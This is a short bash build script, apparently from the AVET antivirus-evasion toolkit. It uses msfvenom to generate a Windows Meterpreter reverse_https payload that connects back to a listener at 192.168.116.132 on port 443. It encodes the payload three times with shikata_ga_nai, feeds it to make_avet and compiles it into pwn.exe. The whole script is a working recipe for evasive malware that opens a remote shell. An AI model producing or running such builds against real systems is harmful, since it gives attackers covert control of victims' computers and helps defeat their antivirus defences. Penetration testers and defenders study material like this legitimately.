#!/bin/bash          
. build/global_win32.sh
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
#./format.sh sc.txt > scclean.txt && rm sc.txt
#cat sc.txt >> defs.h
#echo "" > scclean.txt
./make_avet -f sc.txt -F -p
$win32_compiler -o pwn.exe avet.c
#rm scclean.txt && echo "" > defs.h
